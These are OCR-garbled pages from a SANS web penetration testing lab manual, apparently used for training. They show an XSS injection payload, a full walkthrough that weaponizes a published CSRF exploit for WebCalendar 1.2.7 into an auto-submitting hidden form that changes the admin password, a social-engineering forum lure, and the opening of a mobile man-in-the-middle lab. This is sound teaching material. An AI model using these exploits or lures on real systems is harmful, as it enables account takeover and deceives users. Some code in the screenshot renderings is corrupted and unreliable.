.._,, 
Select Pen Test Tool 
'-../ 
Pen Test TOOi . _., 
.,.. 
~, 
'-' 
.._,, 
.._,, 
'-./ 
No error! 
.._,, 
<happy dance> 
No response either, but that's okay. 
We are getting closer! 
Now let's inject the JavaScript alert. 
Next step: Insert the alert between the semicolon and the comment. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
.._,, 
'-' 
'-./ 
'---' 
\...., 
'-' 
'-..J 
'---' 
.._,, 
'-' 
·....__; 
'-' 
'-./ 
'---' 
'-..J 
'-../ 
.._,, 
'-' 
'---' 
'-' 
.._,, 
'-' 
16 
'-' 
'-...., 
'---' 
Step 8 
Firefox: Reload the page to start fresh, forward in Burp and click Lookup Tool 
Burp: Change the Tool ID to: ToolID=l6"}}) ; alert ( 42) ; / / 
• 
Click Forward 
Firefox: View the result 
Victory is ours! 
'"" 
Clicking OK on the alert also generates this JSON error: 
Error trying to parse JSON:. pPenTestToolsJSON is undefined 
Prevent this page from creating additional dialogs 
OK 
This error is triggered after our JavaScript executes, so it is harmless. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
17 
Final Step 
'-' 
'-' 
Be sure to disable the Burp proxy setting in Firefox so that it does not interfere with future labs. 
Go to the Firefox Proxy Selector drop-down and choose No Proxy. 
• 
f Mutiffidae 
542.1 
1eh Authentication - Diuest 
system Proxy 
1. v'eb Authentication - Forms 
1 
-·· 
__ 
11___ 
IHeartbleed 
1 ~ Manage Proxies 
-.I' Burp 
Rat Proxy 
Zap 
,!:references. 
Ensure No Proxy is set when complete. 
No Proxy v 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 4.5: Command Injection 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-..J 
''-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-" 
'-' 
'-' 
'-' 
'-" 
'-' 
'-' 
'-' 
'-..J 
'-../ 
'-' 
'-' 
18 
'-' 
'-' 
'-' 
~ 
I.Objectives 
• 
Investigate a real-world CSRF flaw found in WebCalendar 
• 
Understand key components of CSRF exploitation 
• 
Tweak and weaponize a PoC exploit 
The WebCalendar CSRF flaw was published on 2016-07-04 by @hyp3rlinx (http:/ /hyp3rlinx.altervista.org/). 
Here is the Proof-of-Concept (Poe) CSRF code created by @hyp3rlinx; we will use this as the basis for our 
exploit (with some changes and additional code): 
1) CSRF Protection Bypass to change Ad min password PoC. Note: Name of the victim user is required for 
success. 
<meta name="referrer" content="none"> 
<form id="CSRF11 action=" 
http://localhost/WebCalendar- 
1.2.7/edit_user_h 
er.php" method="post"> 
type=11hidden 
ame=11formtype11 value="setpassword11 
typ 
· den 
ame="user" value="admin" /> 
wpass "type=11password11 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
1 
'-' 
ltabSetup 
,_, 
The first section of this lab will include a step-by-step walkthrough for creating PoC code for the 
WebCalendar 1.2.7 CSRF vulnerability. 
The second section of the lab will weaponize the CSRF exploit. This section will have three tracks: 
• 
Challenge (no hints) 
• 
Some hints 
• 
Full walkthrough 
Plus, there will be a bonus challenge at the end: Lowering the security of the site by changing the 
WebCalendar 'public access' option via CSRF. 
Note that HTTP referers are spelled two ways during this exercise. During 542.1 we noted (on the 
'HTTP/LO" slide) that RFC 1945 spells referer with three 'R's (and that is how it is spelled in the client 
header; you may check a request in ZAP or Burp to verify). So, Security 542 uses that spelling when 
discussing referers, as do most books and resources that discuss HTTP. 
However: HTML5 (and DOM) use 'referrer' (with four 'R's). This lab uses this HTML5 option: 
<meta name="referrer" content="no-referrer" >. 
'-.....- 
'-...,I 
'-" 
'-.J 
'-...../ 
'-" 
'-' 
'-" 
'-" 
'-" 
'-" 
'-...,;' 
,,_,, 
'-" 
'-" 
'-...../ 
Attentive students may notice the use of both spellings during this lab. While it may be a bit confusing, it is 
correct. 
'-" 
'---' 
'-' 
'-' 
'-...,I 
'-" 
''-' 
'---" 
'---' 
, 
__ __, 
'---' 
'-...,I 
'-../ 
'-../ 
'---' 
'-" 
'-...../ 
'-" 
'-' 
'---' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
2 
'-' 
'-" 
'---' 
Launch ZAP 
Launch ZAP by clicking the ZAP icon in the upper panel at the top of the screen: 
Note: ZAP takes a while to launch, roughly 10 seconds or so. Many students end up accidentally launching 
ZAP two or three times during the delay. Run one instance of ZAP only. 
Multiple instances of ZAP are running if you see this warning: 
In this case, close the additional ZAP instances, leaving the original. 
Warning: When in doubt, close all ZAP instances and start over. ZAP must be listening on port 8081 for this 
lab to work. 
After ZAP starts, launch Firefox by clicking the Firefox icon in the upper panel. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
3 
Configure Firefox to use the running proxy: 
'--' 
In Firefox: Select ZAP from the Proxy Selector drop-down: 
1 
SANS Security 542 - Web 
1.. 
E:~~~~ ~i:l~~· 
B
llITfPRequests and Respoll! 
IHeartbleed 
- 
B1 
JP 
~ 
Snake ML 
Auto-detect 
\__,I
'--' 
'--' 
'--' 
'----' 
'----' 
lshellshock - netstat.1:;gi 
! 
Proxies 
~eb Authen~ca~on - ~~~ ·! ti; n"""F"""'"''"'"" 
i 
Web Authentlcatkm- D1~ ~~""0"~'EF1ff 
'--' 
'-' 
'--' 
'--' 
'--' 
'--' 
'--' 
'-../ 
'-../ 
Ensure ZAP is now chosen as the proxy. 
'--' 
'--' 
'--' 
'----' 
We have already installed a Firefox extension called Proxy Selector and configured it with appropriate 
settings for the student VM. This enables you to quickly switch proxies being used by Firefox. In this case, 
we have already configured proxy settings and saved them under the name ZAP. To activate the use of 
ZAP, simply select ZAP from the proxy list on the right side of the proxy bar at the top of the Firefox 
window. 
This pull-down enables you to automatically configure the browser to use a given web app manipulation 
proxy. 
Note: Always use Proxy Selector to manage Firefox's proxy settings. Do not use other methods. 
Changing the system proxy settings can break future labs. Some system proxy settings attempt to proxy all 
protocols, even ICMP! 
'-../ 
'-../ 
'--' 
'-../ 
'-../ 
'--' 
'--' 
'----' 
\__,I 
.___, 
'----' 
'----' 
'-../ 
.___, 
'--' 
'----' 
'-../
'-../ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
4 
'--' 
'--' 
'---' 
PoC: Step 1 
" 
Open Firefox and go to Exercises toolbar -> Webealendar. 
Note: You must have Firefox set to proxy via ZAP before logging into Webealendar. If you start ZAP later, 
you will have to log in again (via ZAP) for the rest of this section to work correctly. 
,,,......__ 
Log in: 
• 
Username: student 
• 
Password: Security542 
• 
Also, check "Save login via cookies so I don't have to login next time" 
Press "Login" 
Then go to Settings-> My Profile (in the upper-left corner of the calendar): 
r--. 
Note: During this lab, you will still need to log in again, even when "Save login via cookies so I don't have to 
,,-----, 
login next time" is set. This is because our first attempt to test the Poe code will fail, and also trigger the 
,,-----, 
user to be logged out. No worries: We will resolve this issue with the second Poe attempt (and also learn 
" 
why the first attempt failed). 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
5 
PoC: Step 2 
'---' 
For the PoC, we are changing our password to the same password, to avoid the risk of forgetting the new 
password and getting locked out of the account. We will later change the ad min password for real. 
Enter "Security542" under both "New Password" and "New Password (again)". Then press "Set Password". 
Account ---------------------------------, 
Edit User 
Change Password 
Usemame: 
s!!!delll 
:---------- 
S: i r-s t Name: 
LutName: 
New Password: 
Nm ~on:! (a{lalt'l}:L::::: 
.. _ •_
··_•·_··----~· 
Then press "OK": 
'-../ 
'--./ 
'----' 
\..__/ 
'-' 
'-' 
\..__/ 
\..__/ 
'-../ 
'----' 
\..__/ 
. .___, 
'--./ 
'----' 
'-../ 
\..__/ 
\..__/ 
\..__/ 
'----' 
'-' 
\..__/ 
.._, 
\..__/ 
\..__/ 
'-' 
'----' 
'----' 
'----' 
'----' 
'-' 
'-' 
\..__/ 
'--./ 
\..__/ 
'--' 
'--./ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
6 
\..__/ 
'-' 
.._, 
PoC: Step 3 
In ZAP: 
Find the POST to http://www. sec542. org/webcalendar / edi t_user_handler. php 
.. L.Zi fo http://wmv,sec542.org 
POST http:/ /~w. sec542. or<;1/wbcalendar/edi t_user_hano:ter .php Hli?/1.1 
User-Agent, MoziHa/S.O iXll: Linul i686; rv:SG.Ol Getko/20100101 F1refox/5G.O 
A<:tept, text/ht•l .app lication/,:,htm\+1<!!!l. applicationlx•l; q..O. s. • /6 ,q..O. a 
Acee t-L.anguage: en•US.-.n,9-0.S 
r: ... httf:tfiv,.,;i~-11hl/w1lb¢a].gnaar/edi1Ji~i':]li;,I 
: vebcatenaar sessionK 
a1d4S2b999377993'!5d53f4CSdce834b6bE38Saf61aadf7489961:ifca4aS9466a74c183b57~8479; 
endar_ login&student; vebca ,endar _ tast_ viev~bcatenda r'i\i2Faonth. php; wabca lemiar _ 
e~l: P!-f'SESS!l).,cs3007ek22.i\loft7•41'143f5in6 
ion, keep-,live 
.•lflijBCUf'e·Rl'QUests, 1 
·Type: app Ucati.on/x ·'-'""· for11-urtencoded 
Note the referer: Referer: http://www. sec542. org/webcalendar/edi t_user .php 
This will come into play on the next page. 
Right-click on the POST and choose "Generate Anti CSRF Test FORM": 
51 
1/20/18 4:51:45 PM 
GET 
52 1/20/18 4:51:45 PM 
GET 
53 1/20/18 4:51:45 PM 
GET 
54 1/20/18 4:51: 46 PM 
GET 
55 1/20/18 4:52:50 PM 
GET 
57 1/20/18 4:52:50 PM 
GET 
58 1/20118 4:52: 51 PM 
GET 
GET 
http://'Mhw. sec542. orgMebcalendar/js _ cacher. php?inc=jsA.is,ble. php 
http:IN:ww. secs 42. orgtwebcalend art1s _ metier. php?inc=js/users.php:: 
http://www.sec542.org/Webcalendar/ed1t_user.php 
htt :/NM<w.sec542.or 
alendar/"s cacher. 
?inc=·stedit_user .. 
, ttp:/twww. 
calendar/users. php 
http://W>Aw.sec542.orgNiebcalendar/js_cacher.php?inc=JSMs1ble.ph 
http: /IVWffl. sec542, org/Webcalend ar/edit _ user. php 
,.::;~;.:,~,,.,...,c""""''·'·'""'""h""t;,tp:,.::l;,/W,"'w""•"..;·· s=-e:,.:c..:c5..;4 2=
. a rgf:'.:?~l.ia~d ar/Js _ each ec php?i~c»ej,a/ed,t,.~ser •. 
Open URL in Browser 
Show in sues Tab 
Open URL in System Browser 
Copy URLs to Clipboard 
Manage Tags: .•. 
Note ... 
Delete 
Break .. , 
New Alert .. 
Alerts for This Node 
Delete 
tnvcke: 
Add to Zest Script 
Record Zest client script from node ... 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
7 
..._, 
PoC: Step 4 
'--" 
Press "Submit" on ZAP's CSRF Test form: 
bttp:l/www.sec542.org/webcalendar/edit_user_bandler.php 
formtype 
!setpasswotd 
r:====:============~ 
upassword1 !security542 
i 
upasswcrdz L~~=~rity542 
--- 
You should see "Changes successfully saved": 
This worked ... but why did it pass WebCalendar's referer check? Remember the exploit: 
WebCalendar attempts to uses the HTTP Referer to check that requests are originating from same 
server ... However, this can be easily defeated by just not sending a referer.1 
It turns out that ZAP does not set a referer via the Anti-CSRF Test Form, and a blank referer also passes 
WebCalendar's (weak) check. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
'-' 
'--" 
'-' 
'-' 
'-' 
'-' 
'-' 
'--" 
'--" 
'-' 
'-' 
\._,; 
'-' 
..._, 
..._, 
·..._, 
'-' 
..._, 
'-' 
'-' 
'-' 
'-' 
'-.,,I 
'-' 
..._, 
'-' 
'-' 
'----' 
..._, 
'--" 
..._, 
..._, 
..._, 
'--" 
..._, 
..._, 
'--" 
8 
'--" 
'--" 
..._, 
You may verify this by inspecting the new POST sent by the Anti-CSRF Test Form. Scroll to the bottom of 
ZAP's history window, click on the new POST, and click on the "Request" tab. There is no "Referer". 
fl Quick: Start 
I Header: Text 
POST http: //VYhl, sec542. orgNebcalendar/edi t_user_ham:!1er .php HTIP/1. 1 
User-Agent: MozHla/5.0 (Xll; Linux i686; rv:50.0) Gecko/20100101 Firefox/50.0 
Accept: text/html,application/Xhtml+xml,apptication/Xml;q=G.9,*/*;q=0.8 
Accept-Language: en-US,en;q=G.5 
Cookie: webcalendar session= 
d88a8ba7d482b999377993a3dl4f8c929c8a796ba07094619cd47482b94e9f72d76285blbl87b38c5479; webcalendar 
login,,student; vabca lendar_ last_vie.,..,%2!¾ebca lenda~2Fmonth. php; webca Iendar _csscache.,,l; PHPSESSlD= 
bulo, jmc j 9r1 vk6hd8kcej h6i j 4 
Connection: keep-alive 
Upgrade-Insecure-Requests: l 
Content-Type: apptication/x-WW'--form-urlencoded 
Content-Length: 66 
Host: ww. sec542. org 
formtype=setpassword&upasswordl.,,secttrityS42£upassword2=SecurityS42 
If you see a referer, you are probably looking at the original POST (made by the WebCalendar application). 
In that case, scroll down to ZAP's post at the bottom of the history window. 
r, 
Fun fact (for future penetration testing reference): If you save HTML to a file and click on the file, no 
r, 
referer is set or sent. That step is not necessary for this lab, since ZAP does not set a referer. 
PoC Complete, Next Step: Weaponization 
We will next take the PoC code, and weaponize it so that another user falls for our CSRF trap. All they need 
to do is click on our malicious link. We will then change their password to a new one of our choice 
The HTML exploit code from @hyp3rlinx1 is available in: /home/student/Desktop/CSRF/exploit.html 
• 
Note: this code is not fully functional and has some bugs, see notes for details 
• 
It will require editing and some additions to become functional (steps we will perform in this lab) 
• 
Goal: edit that code so that it becomes fully functional (aka weaponized) 
• 
Plan: trick our victim into clicking on a fake video link 
• 
There is no video, we will instead change their WebCalendar password 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
9 
Click on /home/ student/Desktop/CSRF /exploit. html 
., 
Here is what displays in Firefox: 
\._...: 
file~///home/s ..• /exploit. html 
home/student!Desktop/CSRF/exploit.html 
f Mutiilidae 
. .._., 
'-" 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'--' 
'-" 
Note there is no 'submit' button or any direct way for the user to send the POST. Also, note that the 
password boxes are filled in. We certainly don't want our victim to see those! 
'-" 
'-' 
'-' 
There's also a bug in the HTMLS referer setting. The 'meta-name="referrer"' content value should 
be set to "no-referrer" instead of "none". We will address these issues (and more) during this lab. 
'---' 
'-' 
The no-hints challenge section begins next. 
'-" 
'---' 
'-' 
'-' 
'-' 
'-' 
'-..,," 
'-' 
'-' 
'-' 
'---' 
'-' 
'-' 
'--' 
'-" 
'-' 
'-...,/ 
'-...,/ 
'-' 
'-" 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
10 
'----' 
'-' 
'-..,, 
!challenge: No Hints 
Note: Hints and a full walkthrough follow after this section, please feel free to proceed to those. 
Attackers Turn 
• 
Copy/home/student/Desktop/CSRF/exploit.htmlto 
/var/www/html/video.html 
• 
Edit video.html: 
o 
Change the site: 
• 
From: http://localhost/WebCalendar-1.2.7 /edit_user _handler.php 
• 
To: http://www.sec542.org/webcalendar/edit_user _handler.php 
o 
Hide all form fields 
o 
Fix any bugs 
o Add a submit button 
• 
Or better yet: Automatically submit the form using JavaScript 
• 
Go to http://www.sec542.org/phpbb and log in 
o 
Firefox Exercises toolbar -> phpBB 
Login 
Log me on .wrorim~eac!l Wlit 
Hide my oo!ine ~us tis session 
o 
Username: student 
o 
Password: Security542 
• 
Create a "new topic" in the "Breaking lnfoSec News" forum 
o 
Use your best social engineering skills to create a convincing title, post, etc. 
o 
Link to http://www.sec542.org/video.html 
Breaking lnfoSec News 
• 
Close Firefox 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
11 
Victim's Turn 
'--' 
'--' 
• 
We will now act as the victim 
• 
Open Chromium (new browser, signifying the victim) 
o 
Surf to http://www.sec542.org/webca1endar 
o 
Username: admin, password: Security542 
• 
Open a new Chromium tab, and surf to http://www.sec542.org/phpbb 
o 
Don't log in, simply go to the "Breaking lnfoSec News" forum 
o 
Click on the link to video.html 
o 
User admin's password should now be changed 
'---' 
'--' 
'-' 
'---' 
'-' 
'---' 
'---' 
'---' 
'---' 
'-' 
'-' 
'-../ 
'---' 
'-' 
'-' 
'-' 
'-' 
Note: Students who have performed web development in the past may be able to complete this challenge 
with no hints; the rest will need hints and/or the walkthrough. 
Please remember that this lab has three sections: No hints (this section), hints (the next section), and full 
walkthrough (the final section). 
We stress this fact because some students will stop at this section and become stuck. The no-hints 
challenge is designed for advanced students with web application development experience. The rest of us 
will need hints and/or the full walkthrough. 
Note that /var /www /html/video. html maps to http://www. sec542. org/video. html 
when accessed via a browser. 
'---' 
'-' 
'-' 
'-../ 
'---' 
'--" 
'---' 
'---' 
'--" 
'-' 
'--" 
'-../ 
'-' 
'--' 
'---' 
'--' 
'-' 
'---' 
'---' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
12 
'--' 
'---' 
'-...., 
Weaponization: Hints 
• 
A full walkthrough begins on the next page. 
• /home/student/Desktop/CSRF/exploit.html has an HTMLS bug and is also missing functionality, 
including a way to POST the form 
o We previously created /home/student/Desktop/poc.html during the PoC phase of this lab, 
which has all required functionality, except setting the referer 
• 
Combine elements from both scripts into /var/www/html/video.html 
o This will make the script fully functional 
• 
Hide the password fields by adding 'type=hidden' to the two lines of html referencing passwords 
• 
Remember to change the site in exploit.html 
o 
From: http://localhost/WebCalendar-1.2.7 /edit_user _handler.php 
o To: http://www.sec542.org/webcalendar/edit_user_handler.php 
• 
Spoiler alert: Additional code (including how to add a submit button, plus how to auto-submit via 
JavaScript) are in the notes below 
The exploit referer setting has an HTMLS bug, here's the correct code: 
<meta name=11referrer11 content=11no-referrer11> 
This code will add a submit button: 
<button onclick="document.getElementByid ( 'CSRF'). submit() ">Submit</button> 
It requires that the form ID be called "CSRF" (type as one long line): 
<form id="CSRF11 method=11POST11 
action=11http://www.sec542.org/webcalendar/edit_user handler.php11> 
This requires the victim to actually press "submit". You are probably thinking: Not very stealthy. Agreed, so 
here's code to auto-submit via JavaScript (replace the "button onclick" line with): 
<body onload=11setTimeout{function() 
{ document.CSRF.submit() }, 5)11> 
This also requires the "name" to be set to CSRF (type as one long line): 
<form id=11CSRF11 method=11POST
11 
action=11http://www.sec542.org/webcalendar/edit_user handler.php11 
name=11CSRF11> 
In our testing, we discovered that the order of the form options in the code above is important when using 
JavaScript, so please put the options in this order (with name= 11 CSRF II at the end). 
The name/id "CSRF" is arbitrary (you may change it), but it must be consistent throughout your code. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
13 
Step-by-St1 
structions 
'---" 
'---" 
Create /var/www/html/video.html 
Type the following: 
$ gedit /var/www/html/video.html 
Then type the code below: 
<meta name=" referrer" cerrterst==ao- referrer"> 
<form id:"CSRf" method=*'POST" actioo=·http://~lvt. secsez , org/11:iebcalendar/edi t_ user , handler. php"> 
<input type="hidden" name=" fonntype" va lue=" setpassword·> 
<input type="hidden" name="user~ value="admin"> 
<input type:."hidden'' name=·•upasswo rd l" id=-"newpass 1" type="pass11101·d" value=" 123456"> 
<input type="hidden" na~1e="upassword2" id="newpass2" type="pass'tllord" t-,alue="l23456"> 
</form> 
<button one Lf.ck=" document , getElenientByid ( 'CSRF' ) . submit () •>Sub.-iit</button> 
You may also choose to copy /home/student/Desktop/CSRF/exploit.html to /var/www/html/video.html 
and edit that file, which may save you some time. It's your choice: If you choose this route, please check 
your work carefully, as we changed a number of elements of the original exploit. 
Note this is the 'manual POST' version of the script, as a bonus we'll show you how to auto-submit via 
JavaScript at the end of the lab. 
Here is the code. Note the code below has word wrapped longer lines due to space restrictions. Please 
type each line continuously, as shown in the screens hot above. Note: We have stashed a copy of the 
completed file in: /home/ student/Desktop/CSRF /video. html. answer (in case you need 
help typing the HTML). 
<meta name="referrer" content="no-referrer"> 
<form id="CSRF" method="POST" 
action="http://www.sec542.org/webca1endar/edit_user_hand1er.php"> 
<input type="hidden" name="formtype" value="setpassword"> 
<input type="hidden" name="user" value="admin"> 
<input type="hidden" name="upasswordl" id="newpassl" type="password" 
value="123456"> 
<input type="hidden" name="upassword2" id="newpass2" type="password" 
value="123456"> 
</form> 
<button onclick="document.getElementByid('CSRF') .submit()">Submit</button> 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
'---" 
'-J 
'-J 
'-J 
'-J 
'-J 
'-J 
\.,_; 
'-J 
'---" 
'---" 
'--,, 
'--../ 
'-' 
'-J 
'-J 
'--../ 
'-J 
'-J 
'-J 
'-J 
'-J 
'-.../ 
'-...,, 
·-....., 
\.,_; 
'---" 
'-J 
'---" 
'---" 
'---' 
'---' 
\.,_; 
'-J 
'-J 
'---" 
14 
'-../ 
'-J 
'-J 
Go to http://www. sec542. org/phpbb and log in. 
• 
Firefox Exercises tool bar -> phpBB 
Login 
Pa1waJd: 
I forgot my pa5SW'Ctd 
Lag me on adomBlically each \lisit 
CJ Hide rny ~ 
status this session 
• 
Username: student 
• 
Password: Security542 
,,...___ 
Click on the "Breaking lnfoSec News" forum: 
Then click "New Topic": 
Bre 
NE:WTOPIC* 
Sec News 
Search this forum ... 
Seamh 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
15 
Then create the post shown below: 
'--' 
Breaking lnfoSec News 
POST A NEW TOPIC 
Topic.Icon: 
Silbjeci; 
; Ct.eek oot th'is a.mazing vi:ioo! 
Q 
" <f> 
1
~ 
i=, 
I Nmmal 3 
------ 
' Watch this hacker steal millions or dollars from a major omlne bankl 
' 
& 
l [urt]http:J/www .sec542.orglvldeo.html[tm1} 
i 1s your account vulnerable? 
'-..,/ 
'-..,/ 
'-' 
'-' 
'-..,/ 
'--' 
'-' 
'-' 
'-..,/ 
'-' 
'-' 
Here's the text shown above. Feel free to freestyle on the subject and message, but be sure to use the 
proper syntax for creating a link, which is [url] http://www. sec542. org/video. html [/url] 
(note the square brackets around [url] and [/url]: 
Watch this hacker steal millions of dollars from a major online bank! 
[url]http://www.sec542.org/video.html[/url] 
'--' 
'-' 
'-..../ 
'-..../ 
'-..,/ 
'-..,/ 
Is your account vulnerable? 
'-' 
'-..,/ 
Then submit the post (scroll to the bottom). 
'-..,/ 
'-..../ 
'-' 
'-..,/ 
'-..../ 
'-' 
'-..,/ 
'-' 
'-J 
'-' 
'-' 
'-' 
'-..../ 
'-..,/ 
'--' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
16 
'-' 
'-' 
'-..,,, 
We will now act as the victim 
• 
Open Chromium (please use Chromium!) 
o 
New browser, signifying the victim (admin) 
o 
Surf to http://www.sec542.org/webca1endar and log in 
• 
Username: admin 
• 
Password: Security542 
• 
Open a new Chromium tab (press <CTRL>-T), and surf to http://www.sec542.org/phpbb 
• 
Don't log in, simply go to the "Breaking lnfoSec News" forum 
Note that Chromium has links for both WebCalendar and phpBB in the bookmarks bar below the address 
bar: 
Iii SANS 542 -WebPerrT 
Please follow the above advice and switch from Firefox to Chromium. Some students tend to move a bit 
quickly, miss a few nuances, and attempt to complete the entire lab in Firefox. 
Using Chromium will help signify the difference between attacker (using Firefox) and victim (using 
Chromium). It will also ensure that cookies created in Firefox for the attacker (such as the cookie received 
after logging WebCalendar or phpBB) will not be used by the victim. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
17 
Click on the link to http://www.sec542.org/video.html 
'-../ 
'-../ 
Check out this amazing video!! 
POSTREPLY It 
'.°"· Search~is 10plc ..• 
: [ <::tutn-H 
Check out this amazing video!! 
Oby tillllelll :11 Tue Jan 17. 2017 4:11 pm 
watch his hacker steal millions of dollars from a major online bankf 
p1Anwt.sec542.org./\l 
....... ------•r 
Is vmi-r 01..;1,,vurn VL!!Oeram~ 
'-../ 
'-../ 
'-.J 
'-.J 
'-.J 
'-.J 
'-.J 
'-.J 
'-.J 
'-.J 
Press "Submit". 
'-.J 
The CSRF attack was successful if you see "Changes successfully saved": 
'-.J 
'-.J 
'-../ 
'-../ 
'-.J 
'-.J 
'-.J 
\___.,, ' 
'-.J 
'--' 
'--' 
'--' 
'-.J 
'--' 
'-..,/ 
'--' 
'-" 
'-.J 
Note: We will automate the "submit" step via JavaScript in the bonus section next. 
'--' 
User admin's password has been changed to '123456' (assuming you followed the previous steps carefully) 
if you see "Changes successfully saved". 
'-..,/ 
'-.J 
'-..,/ 
'--' 
'--' 
'-..,/ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
18 
'-..,/ 
'-' 
',,_,/ 
Bonus Steps 
• 
Verify admin's password is changed by logging out and logging back in with the new password 
o 
If you followed the lab exactly it is: 
• 
Username: admin 
• 
Password: 123456 
• 
Update the "manual POST" script to use JavaScript to auto-submit the POST 
o 
Full code example is below, and a copy is available in 
/home/student/Desktop/CSRF/video.html.answer-javascript 
o 
No user interaction is required after clicking on the phpBB link 
Here is the code that automatically submits the form using JavaScript; no user interaction is required after 
clicking on the link in phpBB: 
•:meta na111e=" referrer" ccnt errt= vrto- referrer"> 
"'body onload"'"setTimeout(tunction(J { cioc1Jrr:ent.CSRF.!'ub,~it{i }, Si'> 
<form id=''CSftF' method"''POST" actacn=" http:/ /WloM. :s~c542:. org/webcalendar /edit user handler. php'' name="CSAf'"> 
<input type='hidcfen· oar~e="fonntypl!r~ YaLue="satpasi,word"::. 
· 
·· 
<input type=' lndden" na".le=·user· value"' 'adm1n"> 
<input t ype=·'hidd~!l1" oar~e=·upass~1ord1 · 
i.d="ne~.·passl • type=' pas<iword" va1.ue="l23,156"> 
<input type:0hldden" n,t,•e="upass·.~ord2" id"'"new;:iass2" type="password" 
value,,,"123450"> 
</fonn;,, 
</body>j 
,......_, 
This code is the same as the previous manual POST example, except these two lines are different: 
<body onload=11setTimeout{function{) 
{ document.CSRF.submit{) }, 5)11> 
<form id=11CSRF11 method=11POST11 
action=11http://www.sec542.org/webcalendar/edit_user_handler.php11 
name=11CSRF11> 
The 'body onload' line replaces the 'button onclick' line in the manual POST example. Note that 
the order of the form options is important for this JavaScript version; it is safest to list them as shown 
above. We have also stashed a copy of the completed file in: 
/home/student/Desktop/CSRF/video.html.answer-javascript 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
19 
§J'erences 
'---' 
[1] https;//packetstormsecurity.com/files/137762/WebCa lendar-1.2. 7-CSRF-Bypass. html 
(https://cyber.gd/542_550) 
[2] Ibid. 
...._, 
'-' 
'-..,/ 
'-' 
'-..,/ 
'-' 
'-..,/ 
'-' 
'-' 
'-' 
'-../ 
.'---" 
'-..,/ 
'-..,/ 
'-../ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.1: CSRF 
'-' 
'-' 
'-../ 
'-..,/ 
\__., 
'-' 
'-' 
'-' 
'-' 
\___, 
'-' 
'-' 
'-../ 
'-../ 
'-' 
'-' 
\__., 
'-../ 
'-..../ 
.._, 
20 
\___, 
'-' 
'-..../ 
~ 
I Objectives 
• 
Use application testing tools and techniques against a mobile application 
• 
Uncover and exploit a logic flaw 
~ 
• 
Operate as a man-in-the-middle to tamper with sensitive communications 
,,.__ 
!LabNote 
Android phone, 
provided by 
"android" 
Burp Proxy 
Bank server, 
provided by 
"bank-server" 
" 
There are three pieces to this lab, which you launch on the next page: 
1. The Android phone, provided by a locally installed android emulator. 
2. 
Burp Proxy. 
3. The bank server we're about to rob, provided by the "bank-server" script. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
1 
jLabSetup 
'---' 
As previously discussed, this lab involves three separate applications. Please follow these instructions 
carefully. 
This lab requires a static IP address of 192.168.1.8. That is the default address, but we reset it, just in case 
something has changed. 
• 
Configure a static IP address by running the following in a terminal: 
$ sudo config-static.sh 
• 
Start Burp by clicking the Burp icon in the upper panel. 
• 
Open a terminal and start the bank server: 
$ bank-server 
• 
Open another terminal and start the Android emulator: 
$ android 
Note: The android emulator may be sluggish in starting up on some systems. 
If something goes wrong at any point in the lab, you may start over by ending these three programs and 
starting over fresh. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
"-'
'--./
'----' 
'--./
'-../ 
'---' 
'--./
'---' 
'-../ 
'--./
'----' 
'--./ 
'--./
'--./
'-../ 
'-' 
'--./
'--./
'--./
'--./
'----' 
'----' 
'---' 
'--./ 
'----' 
'--./ 
'--./
'---' 
'---' 
'-" 
'---' 
'-" 
'-" 
'- 
'- 
'- 
...__, 
2 
'-...., 
'- 
'-...., 
Load the Base-Androidlabs App 
Unlock the Android phone by sliding the green lock to the right. 
Press the launcher icon at the bottom center of the screen. 
Launch Base-AndroidLabs: 
DO NOT enter a password; simply choose Login. 
The app has cached the credentials from a previous use. 
Warning: Never enter a password if asked by the app; always choose Login. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
3 
The App 
The Base-Android Labs app has three functions: 
• 
Accounts: Shows current balances. 
• 
Statement: Shows previous statements. 
• 
Transfer: We will hack this. 
Android options on the right include: 
• 
Back button: Goes one menu back. 
• 
Home button: Returns to the initial Android screen. 
• 
Menu: Changes settings; do not use this. 
The back button is the most useful for this lab. 
Please do not change any settings via the Menu option; this can break the app's functionality. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.2: Mobile MITM 
'-----' 
\J 
\._.; 
'-----' 
'--' 
\...._/ 
\...._/ 
'--' 
'--' 
'--' 
'--' 
\...._/ 
'-----' 
'-' 
'--../ 
\...._/ 
'-----' 
